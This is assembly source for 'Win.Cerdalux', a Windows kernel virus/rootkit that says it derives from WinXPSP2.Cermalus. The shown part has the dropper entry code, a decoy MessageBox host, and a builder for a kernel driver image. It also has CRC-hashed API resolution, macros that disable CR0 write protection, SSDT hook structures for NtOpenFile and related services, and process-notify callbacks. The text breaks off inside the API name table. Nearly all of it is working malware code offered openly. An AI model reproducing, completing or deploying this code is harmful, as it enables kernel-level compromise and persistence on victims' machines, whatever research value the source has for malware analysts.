; Win.Cerdalux v1 - MIT License
; https://github.com/therealdreg/Win.Cerdalux
;
; based from WinXPSP2.Cermalus by Pluf/7A69ML
;
; Authors:
; 	- David Reguera Garcia aka Dreg dreg@fr33project.org https://www.fr33project.org
;

; masm32 (masm32v11r, MASM32 11 version) https://www.masm32.com/download.htm


.586 ; rdtsc...                                    
.model flat, stdcall                     
option casemap :none                    

include \masm32\include\windows.inc          
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc         
include \masm32\macros\macros.asm
        
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
 
_pushad                     equ 8*4
_pushad_eax                 equ 7*4
_pushad_ecx                 equ 6*4
_pushad_edx                 equ 5*4
_pushad_ebx                 equ 4*4
_pushad_esp                 equ 3*4
_pushad_ebp                 equ 2*4
_pushad_esi                 equ 1*4
_pushad_edi                 equ 0*4
 
IMAGE_FILE_MACHINE_I386     equ 014Ch
 
IMAGE_SUBSYSTEM_NATIVE      equ 01h
IMAGE_SUBSYSTEM_WINDOWS_GUI equ 02h
IMAGE_SUBSYSTEM_WINDOWS_CUI equ 03h
 
IMAGE_FILE_EXECUTABLE_IMAGE equ 00002h
IMAGE_FILE_32BIT_MACHINE    equ 00100h
IMAGE_FILE_SYSTEM           equ 01000h
IMAGE_FILE_DLL              equ 02000h
 
STATIC_PADD                 equ 4096
DYNAMIC_PADD                equ 2048
 
; dos header:
 
mzhdr struct
 mz_magic                   dw  05A4Dh
 mz_cblp                    dw  00090h
 mz_cp                      dw  00003h
 mz_crcl                    dw  00000h
 mz_cparhdr                 dw  00004h
 mz_minalloc                dw  00000h
 mz_maxalloc                dw  0FFFFh
 mz_ss                      dw  00000h
 mz_sp                      dw  000B8h
 mz_csum                    dw  00000h
 mz_ip                      dw  00000h
 mz_cs                      dw  00000h
 mz_lfarlc                  dw  00040h
 mz_ovno                    dw  00000h
 mz_res                     dw  4 dup (0)
 mz_oemid                   dw  00000h
 mz_oeminfo                 dw  00000h
 mz_res2                    dw  10 dup (0)
 mz_lfanew                  dd  000000A8h
mzhdr ends
 
; dos stub:
 
dos_stub struct
 db 00Eh, 01Fh, 0BAh, 00Eh, 000h, 0B4h, 009h, 0CDh
 db 021h, 0B8h, 001h, 04Ch, 0CDh, 021h, 054h, 068h
 db 069h, 073h, 020h, 070h, 072h, 06Fh, 067h, 072h
 db 061h, 06Dh, 020h, 063h, 061h, 06Eh, 06Eh, 06Fh
 db 074h, 020h, 062h, 065h, 020h, 072h, 075h, 06Eh
 db 020h, 069h, 06Eh, 020h, 044h, 04Fh, 053h, 020h
 db 06Dh, 06Fh, 064h, 065h, 02Eh, 00Dh, 00Dh, 00Ah
 db 024h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
 db 05Dh, 017h, 01Dh, 0DBh, 019h, 076h, 073h, 088h
 db 019h, 076h, 073h, 088h, 019h, 076h, 073h, 088h
 db 0E5h, 056h, 061h, 088h, 018h, 076h, 073h, 088h
 db 052h, 069h, 063h, 068h, 019h, 076h, 073h, 088h
 db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
dos_stub ends
 
; data directory entry:
 
pe_ddir struct
 ddir_rva                   dd  ?   ; 00h
 ddir_size                  dd  ?   ; 04h
pe_ddir ends
 
; export directory:
 
pedir_export struct
 flags                      dd  ?   ; 00h
 timedate                   dd  ?   ; 04h
 major                      dw  ?   ; 08h
 minor                      dw  ?   ; 0Ah
 dllname                    dd  ?   ; 0Ch
 dllbase                    dd  ?   ; 10h
 numoffunctions             dd  ?   ; 14h
 numofnames                 dd  ?   ; 18h
 rvaoffunctions             dd  ?   ; 1Ch
 rvaofnames                 dd  ?   ; 20h
 rvaofordinals              dd  ?   ; 24h
pedir_export ends
 
; import directory:
 
pedir_import struct
 ilt                        dd  ?   ; 00h
 timedate                   dd  ?   ; 04h
 forward                    dd  ?   ; 08h
 name_                      dd  ?   ; 0Ch
 iat                        dd  ?   ; 10h
pedir_import ends
 
; PE header:
 
pehdr struct
 
 ; signature:
 pe_signature               dd  00004550h
 
 ; file header:
 pe_coff_machine            dw  0014Ch
 pe_coff_numofsects         dw  00001h
 pe_coff_timedatastamp      dd  045F207DDh
 pe_coff_symrva             dd  000000000h
 pe_coff_symcount           dd  000000000h
 pe_coff_ophdrsize          dw  000E0h
 pe_coff_flags              dw  0010Eh
 
 ; optional header:
 pe_ophdr_magic             dw  0010Bh
 pe_ophdr_majorlink         db  005h
 pe_ophdr_minorlink         db  00Ch
 pe_ophdr_sizeofcode        dd  (((offset drvcode_end - offset drvcode_begin)+(20h-1)) and (not(20h-1)))
 pe_ophdr_sizeofinitdata    dd  000000000h
 pe_ophdr_sizeofuinitdata   dd  000000000h
 pe_ophdr_entrypointrva     dd  000000200h
 pe_ophdr_baseofcoderva     dd  000000200h
 pe_ophdr_baseofdatarva     dd  (((offset drv_end - offset drv_begin)+(20h-1)) and (not(20h-1)))
 pe_ophdr_imagebase         dd  000010000h
 pe_ophdr_sectalign         dd  000000020h
 pe_ophdr_filealign         dd  000000020h
 pe_ophdr_majorosv          dw  00004h
 pe_ophdr_minorosv          dw  00000h
 pe_ophdr_majorimagev       dw  00000h
 pe_ophdr_minorimagev       dw  00000h
 pe_ophdr_majorsubsv        dw  00004h
 pe_ophdr_minorsubsv        dw  00000h 
 pe_ophdr_unknown           dd  000000000h
 pe_ophdr_imagesize         dd  (offset drv_end - offset drv_begin)
 pe_ophdr_hdrsize           dd  000000200h
 pe_ophdr_checksum          dd  000000000h
 pe_ophdr_subsystem         dw  00001h
 pe_ophdr_dllflags          dw  00000h
 pe_ophdr_stackreservesize  dd  00100000h
 pe_ophdr_stackcommitsize   dd  00001000h
 pe_ophdr_heapreservesize   dd  00100000h
 pe_ophdr_heapcommitsize    dd  00001000h
 pe_ophdr_loaderflags       dd  00000000h
 pe_ophdr_rvaandsizecount   dd  00000010h
 
 ; data directory []
 pe_dd_export               pe_ddir <?>
 pe_dd_import               pe_ddir <?>
 pe_dd_rsrc                 pe_ddir <?>
 pe_dd_except               pe_ddir <?>
 pe_dd_security             pe_ddir <?>
 pe_dd_reloc                pe_ddir <?>
 pe_dd_debug                pe_ddir <?>
 pe_dd_arch                 pe_ddir <?>
 pe_dd_global               pe_ddir <?>
 pe_dd_tls                  pe_ddir <?>
 pe_dd_config               pe_ddir <?>
 pe_dd_bound                pe_ddir <?>
 pe_dd_iat                  pe_ddir <?>
 pe_dd_delay                pe_ddir <?>
 pe_dd_com                  pe_ddir <?>
 pe_dd_rsrv                 pe_ddir <?>
pehdr ends
 
; section table entry:
 
pe_sect struct
 sect_name                  db  2Eh, 74h, 65h, 78h, 74h, 3 dup(0)
 sect_virtsize              dd  (offset drvcode_end - offset drvcode_begin)
 sect_virtaddr              dd  000000200h
 sect_rawsize               dd  (((offset drvcode_end - offset drvcode_begin)+(20h-1)) and (not(20h-1)))
 sect_rawaddr               dd  000000200h
 sect_reladdr               dd  000000000h
 sect_lineaddr              dd  000000000h
 sect_relcount              dw  00000h
 sect_linecount             dw  00000h
 sect_flags                 dd  068000020h
pe_sect ends
 
; section table:
 
sectbl struct
text                        pe_sect <>
sectbl ends
 
; basic .sys file format:
 
sys_body struct
 sys_mz_hdr                 mzhdr       <>
 sys_dos                    dos_stub    <>
 sys_pe_hdr                 pehdr       <>
 sys_sectbl                 sectbl      <>
 sys_pad                    dd 14 dup(0)
sys_body ends
 
 ;-------------------------------------
 ; ring0 data
 ;-------------------------------------
 
; ring0 apis structs:
 
api_entry struct
 va                         dd  ?
 eat                        dd  ?
api_entry ends
 
; apis ntoskrnl.exe:
 
ntosapi struct
 DbgPrint                   api_entry <>
 DbgPrintEx                 api_entry <>
 DbgPrintReturnControlC     api_entry <>
 ExAllocatePool             api_entry <>
 ExFreePool                 api_entry <>
 IoAllocateMdl              api_entry <>
 IoCompleteRequest          api_entry <>
 IoCreateDevice             api_entry <>
 IoCreateFile               api_entry <>
 IoDeleteDevice             api_entry <>
 IoDriverObjectType         api_entry <>
 IoFreeMdl                  api_entry <>
 KeBugCheck                 api_entry <>
 KeInitializeDpc            api_entry <>
 KeInitializeSpinLock       api_entry <>
 KeInitializeTimer          api_entry <>
 KeServiceDescriptorTable   api_entry <>
 KeSetTimer                 api_entry <>
 MmGetSystemRoutineAddress  api_entry <>
 MmProbeAndLockPages        api_entry <>
 MmUnlockPages              api_entry <>
 ObDereferenceObject        api_entry <>
 ObReferenceObjectByHandle  api_entry <>
 ProbeForRead               api_entry <>
 ProbeForWrite              api_entry <>
 PsRemoveCreateThreadNotifyRoutine  api_entry <>
 PsSetCreateProcessNotifyRoutine    api_entry <>
 PsSetCreateThreadNotifyRoutine     api_entry <> 
 ZwClose                    api_entry <>
 ZwCreateSection            api_entry <>
 ZwMapViewOfSection         api_entry <>
 ZwOpenDirectoryObject      api_entry <>
 ZwOpenFile                 api_entry <>
 ZwQueryInformationFile     api_entry <>
 ZwUnmapViewOfSection       api_entry <>
 wcscmp                     api_entry <>
ntosapi ends
ntos_api_count              equ (size ntosapi) shr 2
 
; api hall.dll:
 
halapi struct
 KeAcquireSpinLock          api_entry <>
 KeGetCurrentIrql           api_entry <>
 KeReleaseSpinLock          api_entry <>
halapi ends
hal_api_count               equ (size halapi) shr 2
 
; ring0api:
 
ring0api struct
 ntos_base                  dd  ?
 ntos        ntosapi        <>
 hal_base                   dd  ?
 hal         halapi         <>
 ring0api ends
ring0_api_count             equ (size ring0api) shr 2
 
; ring0 nt services:
 
ntserv_entry struct
 va                         dd  ?
 ssdt                       dd  ?
ntserv_entry ends
 
ntservices struct
 NtDebugActiveProcess       ntserv_entry <>
 NtEnumerateBootEntries     ntserv_entry <>
 NtOpenFile                 ntserv_entry <>
ntservices ends
ntservices_count            equ (size ntservices) shr 2
 
; ring0data:
 
ring0data struct
 api             ring0api    <>
 ntdll_map_base              dd  ?
 services        ntservices  <>
 service_table               dd  ?
 service_count               dd  ?
 driver_object               dd  ?
 module_list                 dd  ?
 kirql                       dd  ?
 kspinlock                   dd  ?
 reserved                    dd 4 dup(?)
ring0data ends
 
 ;--------------------------------------
 ; ring0 include
 ;--------------------------------------
 
; ntstauts:
 
STATUS_SUCCESS                  equ 000000000h
STATUS_UNSUCCESSFUL             equ 0C0000001h
STATUS_NOT_IMPLEMENTED          equ 0C0000002h
STATUS_IMAGE_NOT_AT_BASE        equ 040000003h
 
; bugcheck code:
 
POWER_FAILURE_SIMULATE          equ 0000000E5h
 
; major function codes for IRPs:
 
IRP_MJ_CREATE                   equ 00h
IRP_MJ_CREATE_NAMED_PIPE        equ 01h
IRP_MJ_CLOSE                    equ 02h
IRP_MJ_READ                     equ 03h
IRP_MJ_WRITE                    equ 04h
IRP_MJ_QUERY_INFORMATION        equ 05h
IRP_MJ_SET_INFORMATION          equ 06h
IRP_MJ_QUERY_EA                 equ 07h
IRP_MJ_SET_EA                   equ 08h
IRP_MJ_FLUSH_BUFFERS            equ 09h
IRP_MJ_QUERY_VOLUME_INFORMATION equ 0Ah
IRP_MJ_SET_VOLUME_INFORMATION   equ 0Bh
IRP_MJ_DIRECTORY_CONTROL        equ 0Ch
IRP_MJ_FILE_SYSTEM_CONTROL      equ 0Dh
IRP_MJ_DEVICE_CONTROL           equ 0Eh
IRP_MJ_INTERNAL_DEVICE_CONTROL  equ 0Fh
IRP_MJ_SHUTDOWN                 equ 10h
IRP_MJ_LOCK_CONTROL             equ 11h
IRP_MJ_CLEANUP                  equ 12h
IRP_MJ_CREATE_MAILSLOT          equ 13h
IRP_MJ_QUERY_SECURITY           equ 14h
IRP_MJ_SET_SECURITY             equ 15h
IRP_MJ_POWER                    equ 16h
IRP_MJ_SYSTEM_CONTROL           equ 17h
IRP_MJ_DEVICE_CHANGE            equ 18h
IRP_MJ_QUERY_QUOTA              equ 19h
IRP_MJ_SET_QUOTA                equ 1Ah
IRP_MJ_PNP                      equ 1Bh
IRP_MJ_PNP_POWER                equ IRP_MJ_PNP
IRP_MJ_MAXIMUM_FUNCTION         equ 1Bh
 
; values for the Attributes field:
 
OBJ_INHERIT                     equ 00000002h
OBJ_PERMANENT                   equ 00000010h
OBJ_EXCLUSIVE                   equ 00000020h
OBJ_CASE_INSENSITIVE            equ 00000040h
OBJ_OPENIF                      equ 00000080h
OBJ_OPENLINK                    equ 00000100h
OBJ_KERNEL_HANDLE               equ 00000200h
OBJ_VALID_ATTRIBUTES            equ 000003F2h
 
NtCurrentProcess                equ -1
NtCurrentThread                 equ -2
 
; (enum) pool type:
 
NonPagedPool                    equ 0
PagedPool                       equ 1
 
; (enum) lock operation:
 
IoReadAccess                    equ 0
IoWriteAccess                   equ 1
IoModifyAccess                  equ 2
 
; (enum) mode:
 
KernelMode                      equ 0
UserMode                        equ 1
MaximumMode                     equ 2
 
STANDARD_RIGHTS_REQUIRED        equ 000F0000h
FILE_DIRECTORY_FILE             equ 00000001h
FILE_SYNCHRONOUS_IO_NONALERT    equ 020h
FileStandardInformation         equ 5
 
; (enum) section inherit:
 
ViewShare                       equ 1
ViewUnmap                       equ 2
 
; Interrupt Request Level (IRQL):
 
KIRQL           typedef BYTE
PKIRQL          typedef PTR BYTE
 
; Spin Lock:
 
KSPIN_LOCK      typedef DWORD ; ULONG_PTR
PKSPIN_LOCK     typedef PTR DWORD
 
; list entry:
 
list_entry struct           ; size = 08h
 Flink                      dd  ?   ; 00h
 Blink                      dd  ?   ; 04h
list_entry ends
 
; unicode string:
 
unicode_string struct       ; size = 08h
 _Length                    dw  ?   ; 00h
 MaximumLength              dw  ?   ; 02h
 Buffer                     dd  ?   ; 04h
unicode_string ends
 
; large integer:
 
large_integer struct        ; size = 08h
 LowPart                    dd  ?   ; 00h
 HighPart                   dd  ?   ; 04h
large_integer ends
 
; io status block:
 
io_status_block struct      ; size = 08h
 Status                     dd  ?   ; 00h
 Information                dd  ?   ; 04h
io_status_block ends
 
; memory descriptor list:
 
mdl struct                  ; size = 01Ch
 Next                       dd  ?   ; 00h
 _Size                      dw  ?   ; 04h
 MdlFlags                   dw  ?   ; 06h
 Process                    dd  ?   ; 08h
 MappedSystemVa             dd  ?   ; 0Ch
 StartVa                    dd  ?   ; 10h
 ByteCount                  dd  ?   ; 14h
 ByteOffset                 dd  ?   ; 18h
mdl ends
 
; driver extension:
 
driver_extension struct     ; size = 18h
 DriverObject               dd  ?   ; 00h
 AddDevice                  dd  ?   ; 04h
 Count                      dd  ?   ; 08h
 ServiceKeyName unicode_string  <>  ; 0Ch
 ClientDriverExtension      dd  ?   ; 14h
 FsFilterCallbacks          dd  ?   ; 18h
driver_extension ends
 
; driver object:
 
driver_object struct        ; size = 0A8h
 _Type                      dw  ?   ; 00h
 _Size                      dw  ?   ; 04h
 DeviceObject               dd  ?   ; 04h
 Flags                      dd  ?   ; 08h
 DriverStart                dd  ?   ; 0Ch
 DriverSize                 dd  ?   ; 10h
 DriverSection              dd  ?   ; 14h
 DriverExtension            dd  ?   ; 18h
 DriverName      unicode_string <>	; 1Ch
 HardwareDatabase           dd  ?   ; 24h
 FastIoDispatch             dd  ?   ; 28h
 DriverInit                 dd  ?   ; 2Ch
 DriverStartIo              dd  ?   ; 30h
 DriverUnload               dd  ?   ; 34h
 MajorFunction		        dd  (IRP_MJ_MAXIMUM_FUNCTION + 1) dup(?)	; 0038h
driver_object ends
 
; object directory entry:
 
object_directory_entry struct   ; size = 08h
 ChainLink                  dd  ?   ; 00h
 Object                     dd  ?   ; 04h
object_directory_entry ends
 
; object directory:
 
object_directory struct     ; size = 0A2h
 HashBuckets                dd  37 dup(?) ; 00h
 _Lock                      dd  ?   ; 094h
 DeviceMap                  dd  ?   ; 098h
 SessionId                  dd  ?   ; 09Ch
 Reserved                   dw  ?   ; 0A0h
 SymbolicLinkUsageCount     dw  ?   ; 0A2h
object_directory ends
 
; object header:
 
object_header struct        ; size = 018h
 PointerCount               dd  ?   ; 00h
 HandleCount                dd  ?   ; 04h
 NextToFree                 dd  ?   ; 04h
 _Type                      dd  ?   ; 08h
 NameInfoOffset             db  ?   ; 0Ch
 HandleInfoOffset           db  ?   ; 0Dh
 QuotaInfoOffset            db  ?   ; 0Eh
 Flags                      db  ?   ; 0Fh
 ObjectCreateInfo           dd  ?   ; 10h
 QuotaBlockCharged          dd  ?   ; 10h
 SecurityDescriptor         dd  ?   ; 14h
 Body                       dd  ?   ; 18h
object_header ends
 
; ServiceDescriptorEntry:
 
service_descriptor_entry struct ; size = 10h
 ServiceTableBase           dd  ?   ; 00h
 ServiceCounterTableBase    dd  ?   ; 04h
 NumberOfServices           dd  ?   ; 08h
 ParamTableBase             dd  ?   ; 0Ch
service_descriptor_entry ends
 
; deferred procedure call (DPC) object:
 
kdpc struct                 ; size = 020h
 _Type                      dw  ?   ; 00h
 Number                     db  ?   ; 02h
 Importance                 db  ?   ; 03h
 DpcListEntry    list_entry <>      ; 04h
 DeferredRoutine            dd  ?   ; 0Ch
 DeferredContext            dd  ?   ; 10h
 SystemArgument1            dd  ?   ; 14h
 SystemArgument2            dd  ?   ; 18h
 _Lock                      dd  ?   ; 1Ch
kdpc ends
 
; timer object:
 
ktimer struct               ; size = 028h
 Header                     dd 4 dup(?) ; 00h
 DueTime                    large_integer   <>  ; 10h
 TimerListEntry             list_entry      <>  ; 18h
 Dpc                        dd  ?   ; 20h
 Period                     dd  ?   ; 24h
ktimer ends
 
; object attributes:
 
object_attributes struct    ; size = 18h
 _Length                    dd  ?   ; 00h
 RootDirectory              dd  ?   ; 04h
 ObjectName                 dd  ?   ; 08h
 Attributes                 dd  ?   ; 0Ch
 SecurityDescriptor         dd  ?   ; 10h
 SecurityQualityOfService   dd  ?   ; 14h
object_attributes ends
 
; file standard information:
 
file_standard_information struct    ; size = 018h
 AllocationSize large_integer   <>  ; 00h
 EndOfFile      large_integer   <>  ; 08h
 NumberOfLinks              dd  ?   ; 10h
 DeletePending              db  ?   ; 14h
 Directory                  db  ?   ; 15h
                            db  2 dup(?)
file_standard_information ends
 
; thread information block, XPSP2 version:
 
nt_tib struct               ; sizeof = 1Ch
 ExceptionList              dd  ?   ; 00h
 StackBase                  dd  ?   ; 04h
 StackLimit                 dd  ?   ; 08h
 SubSystemTib               dd  ?   ; 0Ch
 union
  FiberData                 dd  ?   ; 10h
  Version                   dd  ?   ; 10h   
 ends
 ArbitraryUserPointer       dd  ?   ; 14h
 Self                       dd  ?   ; 18h
nt_tib ends
 
; processor control region, XPSP2 version:
 
kpcr struct                 ; size = 54h
 NtTib                      nt_tib  <>  ; 00h
 SelfPcr                    dd  ?   ; 1Ch
 Prcb                       dd  ?   ; 20h
 Irql                       dd  ?   ; 24h
 IRR                        dd  ?   ; 28h
 IrrActive                  dd  ?   ; 2Ch
 IDR                        dd  ?   ; 30h
 KdVersionBlock             dd  ?   ; ptr
 IDT                        dd  ?   ; 38h
 GDT                        dd  ?   ; 3Ch
 TSS                        dd  ?   ; 40h
 MajorVersion               dw  ?   ; 44h
 MinorVersion               dw  ?   ; 46h
 SetMember                  dd  ?   ; 48h
 StallScaleFactor           dd  ?   ; 4Ch
 DebugActive                db  ?   ; 50h
 Number                     db  ?   ; 51h
                            db 2 dup(?) ; 052
kpcr ends
 
; PsLoadedModuleList module entry
 
module_entry struct
 list                       list_entry <>
 unk1                       dd 4 dup(?)
 base                       dd  ?
 entrypoint                 dd  ?
 unk2                       dd  ?
 path                       unicode_string  <>
 _name                      unicode_string  <>
 ; ...
module_entry ends
 
; offset KPCR->KdVersionBlock, XPSP2 version:
 
KPCR_KDVERSIONBLOCK_OFFSET  equ 034h
 
; kernel debug data header32, XPSP2 version:
 
dbgkd_debug_data_header32 struct    ; size = 0Ch
 List                       list_entry  <>  ; 00h
 OwnerTag                   dd  ?   ; 08h
 _size                      dd  ?   ; 0Ch
dbgkd_debug_data_header32 ends
 
; kernel debugger data32, XPSP2 version:
 
kddebugger_data32 struct
 Header                         dbgkd_debug_data_header32   <>
 KernBase                       dd  ?
 BreakpointWithStatus           dd  ?
 SavedContext                   dd  ?
 ThCallbackStack                dw  ?
 NextCallback                   dw  ?
 FramePointer                   dw  ?
 PaeEnabled                     dw  ?   
 KiCallUserMode                 dd  ?
 KeUserCallbackDispatcher       dd  ?    
 PsLoadedModuleList             dd  ?     
 PsActiveProcessHead            dd  ?
 PspCidTable                    dd  ?    
 ExpSystemResourcesList         dd  ?
 ExpPagedPoolDescriptor         dd  ?
 ExpNumberOfPagedPools          dd  ?    
 KeTimeIncrement                dd  ?
 KeBugCheckCallbackListHead     dd  ?
 KiBugcheckData                 dd  ?    
 IopErrorLogListHead            dd  ?    
 ObpRootDirectoryObject         dd  ?
 ObpTypeObjectType              dd  ?    
 MmSystemCacheStart             dd  ?      
 MmSystemCacheEnd               dd  ?
 MmSystemCacheWs                dd  ?    
 MmPfnDatabase                  dd  ?
 MmSystemPtesStart              dd  ?
 MmSystemPtesEnd                dd  ?
 MmSubsectionBase               dd  ?
 MmNumberOfPagingFiles          dd  ?        
 MmLowestPhysicalPage           dd  ?
 MmHighestPhysicalPage          dd  ?
 MmNumberOfPhysicalPages        dd  ?    
 MmMaximumNonPagedPoolInBytes   dd  ?   
 MmNonPagedSystemStart          dd  ?
 MmNonPagedPoolStart            dd  ?
 MmNonPagedPoolEnd              dd  ?    
 MmPagedPoolStart               dd  ?
 MmPagedPoolEnd                 dd  ?
 MmPagedPoolInformation         dd  ?
 MmPageSize                     dd  ?    
 MmSizeOfPagedPoolInBytes       dd  ?    
 MmTotalCommitLimit             dd  ?
 MmTotalCommittedPages          dd  ?
 MmSharedCommit                 dd  ?
 MmDriverCommit                 dd  ?
 MmProcessCommit                dd  ?
 MmPagedPoolCommit              dd  ?
 MmExtendedCommit               dd  ?    
 MmZeroedPageListHead           dd  ?
 MmFreePageListHead             dd  ?
 MmStandbyPageListHead          dd  ?
 MmModifiedPageListHead         dd  ?
 MmModifiedNoWritePageListHead  dd  ?
 MmAvailablePages               dd  ?
 MmResidentAvailablePages       dd  ?       
 PoolTrackTable                 dd  ?
 NonPagedPoolDescriptor         dd  ?    
 MmHighestUserAddress           dd  ?
 MmSystemRangeStart             dd  ?
 MmUserProbeAddress             dd  ?
 KdPrintCircularBuffer          dd  ?
 KdPrintCircularBufferEnd       dd  ?
 KdPrintWritePointer            dd  ?   
 KdPrintRolloverCount           dd  ?
 MmLoadedUserImageList          dd  ?
kddebugger_data32 ends
 
 ;--------------------------------------
 ; ring3 data
 ;--------------------------------------
 
; ring3 apis structs:
 
api_entry struct
 va                         dd  ?
 eat                        dd  ?
api_entry ends
 
; apis kernel32.dll:
 
kernapi struct
 CloseHandle                api_entry <>
 CreateFileA                api_entry <>
 CreateFileMappingA         api_entry <>
 DeleteFileA                api_entry <>
 GetFullPathNameA           api_entry <>
 LoadLibraryA               api_entry <>
 MapViewOfFile              api_entry <>
 UnmapViewOfFile            api_entry <>
 VirtualAlloc               api_entry <>
 VirtualFree                api_entry <>
 WriteFile                  api_entry <>
kernapi ends
kern_api_count              equ  (size kernapi) shr 2
 
; apis ntdll.dll:
 
ntdllapi struct
 ZwEnumerateBootEntries     api_entry <>
ntdllapi ends
ntdll_api_count             equ (size ntdllapi) shr 2
 
; apis advapi32.dll:
 
advapi struct
 CloseServiceHandle         api_entry <>
 ControlService             api_entry <>
 CreateServiceA             api_entry <>
 DeleteService              api_entry <>
 OpenSCManagerA             api_entry <>
 OpenServiceA               api_entry <>
 StartServiceA              api_entry <>
advapi ends
adv_api_count               equ (size advapi) shr 2
 
; ring3api:
 
ring3api struct
 kern_base                  dd  ?
 kern        kernapi        <>
 adv_base                   dd  ?
 adv         advapi         <>
 ntdll_base                 dd  ?
 ntdll       ntdllapi       <>
ring3api ends
ring3_api_count             equ (size ring3api) shr 2
 
; ring3data:
 
ring3data struct
 api         ring3api       <>
 file_handle                dd  ?
 map_addr                   dd  ?
 map_handle                 dd  ?
 scm_handle                 dd  ?
 service_handle             dd  ?
 buff                       dd  ?
ring3data ends
 
 ;--------------------------------------
 ; ring3 include
 ;--------------------------------------
 
; service status:
 
service_status struct       ; size = 01Ch
 dwServiceType              dd  ?   ; 00h
 dwCurrentState             dd  ?   ; 04h
 dwControlsAccepted         dd  ?   ; 08h
 dwWin32ExitCode            dd  ?   ; 0Ch
 dwServiceSpecificExitCode  dd  ?   ; 10h
 dwCheckPoint               dd  ?   ; 14h
 dwWaitHint                 dd  ?   ; 18h
service_status ends
 
 ;--------------------------------------
 ; hooks/callbacks data
 ;--------------------------------------
 
hook_data_offset        equ 0Bh
 
hook_data struct
signature                   dd  ? 
return_                     dd  ? 
hook_data ends
 
pssetcreateprocessnotifyroutine_param_count         equ 02h
pssetremovecreatethreadnotifyroutine_params_count   equ 01h
ntdebugactiveprocess_param_count    equ 02h
ntenumeratebootentries_param_count  equ 02h
ntopenfile_param_count              equ 06h 
custom_dpc_param_count              equ 04h
driverentry_param_count             equ 02h
driverunload_param_count            equ 01h
 
 ;--------------------------------------
 ; DPC wdog context
 ;--------------------------------------
 
wdog_context struct
 Dpc                        kdpc    <>  ; 00h
 Timer                      ktimer  <>  ; 20h
 data                           dd  ?   ; 48h
wdog_context ends
 
 ;--------------------------------------
 ; macros
 ;--------------------------------------
 
; get callback parameter:
 
@gparam macro reg, pnum
        mov reg, dword ptr [esp + _pushad + 4 + (pnum * 4)]
endm
 
; initialize object attributes:
 
@init_object_attributes macro p, r, n, a, s
        mov     dword ptr [p + object_attributes._Length], size object_attributes
        mov     dword ptr [p + object_attributes.RootDirectory], r
        mov     dword ptr [p + object_attributes.ObjectName], n
        mov     dword ptr [p + object_attributes.Attributes], a
        mov     dword ptr [p + object_attributes.SecurityDescriptor], s
        mov     dword ptr [p + object_attributes.SecurityQualityOfService], s
endm
 
; ring0 callback begin:
 
@cb_begin macro
        pushad                                              ; save initial registers
        call    getdelta                                    ; get delta offset: ebp
        mov     ebx, dword ptr [ebp]                        ; get ptr to ring0data: ebx
endm
 
; ring0 callback end:
 
@cb_end macro args
        mov     dword ptr [esp + _pushad_eax], eax          ; set ret value: eax
        popad                                               ; restore initial registers
        ret (args * 4)                                      ; clean stack: stdcall args >= 0, cdecl args = 0
endm
 
; disable page protection:
 
@unprotect_mring0 macro
        cli
        push    eax
        mov     eax, cr0
        and     eax, not 10000h
        mov     cr0, eax
        pop     eax
endm
 
; enable page protection:
 
@protect_mring0 macro
        push    eax
        mov     eax, cr0
        or      eax, 10000h
        mov     cr0, eax
        pop     eax
        sti
endm
 
; end string:
 
@endsz macro
        local   nxtchr
nxtchr: lodsb
        test    al,al
        jnz     nxtchr
endm
 
 ;--------------------------------------
 ; SEH
 ;--------------------------------------
 
except_handler struct
 EH_Dummy                   dd  ?
 EH_ExceptionRecord         dd  ? 
 EH_EstablisherFrame        dd  ?
 EH_ContextRecord           dd  ?
 EH_DispatcherContext       dd  ?
except_handler ends
 
; create seh frame:
 
@ring3seh_setup_frame macro handler
        local   set_new_eh
        call    set_new_eh
        mov     esp, dword ptr [esp + except_handler.EH_EstablisherFrame]
        handler
set_new_eh:     assume fs:nothing
        push    fs:[0]
        mov     fs:[0], esp
endm
 
; remove seh frame:
 
@ring3seh_remove_frame macro
        assume  fs:nothing
        pop     fs:[0]
        add     esp, 4
endm
 
        ;--------------------------------------
        ; dropper code
        ;--------------------------------------
.code
start:
        xor     eax, eax
        dec     eax
        shr     eax, 20
        mov     ecx, eax
        not     ecx
        mov     ebx, offset drv_end - offset start
        add     ebx, eax
        and     ebx, ecx
        mov     edx, offset start
        and     edx, ecx
        push    edx
        push    eax
        push    esp
        push    PAGE_READWRITE
        push    ebx
        push    edx
        call    VirtualProtect
        mov     esi, offset api_names_begin
next_module_crc_table:
        lodsd
        test    eax, eax
        jz      end_crc
        mov     edi, eax
        lodsb
        movzx   ecx, al
next_api_crc:
        mov     eax, esi
        call    gen_crc32_szname
        stosd
        @endsz
        loop    next_api_crc
        xchg    eax, ecx
        stosd
        mov     eax, esi
        call    gen_crc32_szname
        stosd
        @endsz
        jmp     next_module_crc_table
end_crc:
        mov     eax, offset host_start
        mov     dword ptr [host_start_ep], eax
        pop     eax
        pop     edx
        push    esp
        push    eax
        push    ebx
        push    edx
        call    VirtualProtect
        jmp     ring3_start
host_start:
        xor     edi, edi
        push    edi
        push    offset _title
        push    offset _text
        push    edi
        call    MessageBox
        push    edi
        call    ExitProcess
api_names_begin:
        ; ntoskrnl.exe:
        dd  offset ntoscrc_begin
        db  (ntos_api_count shr 1)
        db  "DbgPrint",                 0h
        db  "DbgPrintEx",               0h
        db  "DbgPrintReturnControlC",   0h
        db  "ExAllocatePool",           0h
        db  "ExFreePool",               0h
        db  "IoAllocateMdl",            0h
        db  "IoCompleteRequest",        0h
        db  "IoCreateDevice",           0h
        db  "IoCreateFile",             0h
        db  "IoDeleteDevice",           0h
        db  "IoDriverObjectType",       0h
        db  "IoFreeMdl",                0h
        db  "KeBugCheck",               0h
        db  "KeInitializeDpc",          0h
        db  "KeInitializeSpinLock",     0h
        db  "KeInitializeTimer",        0h
        db  "KeServiceDescriptorTable", 0h
        db  "KeSetTimer",               0h
        db  "MmGetSystemRoutineAddress",0h
        db  "MmProbeAndLockPages",      0h
        db  "MmUnlockPages",            0h
        db  "ObDereferenceObject",      0h
        db  "ObReferenceObjectByHandle",0h
        db  "ProbeForRead",             0h
        db  "ProbeForWrite",            0h
        db  "PsRemoveCreateThreadNotifyRoutine",0h
        db  "PsSetCreateProcessNotifyRoutine",  0h
        db  "PsSetCreateThreadNotifyRoutine",   0h
        db  "ZwClose",                  0h
        db  "ZwCreateSection",          0h
        db  "ZwMapViewOfSection",       0h
        db  "ZwOpenDirectoryObject",    0h
        db  "ZwOpenFile",               0h
        db  "ZwQueryInformationFile",   0h
        db  "ZwUnmapViewOfSection",     0h
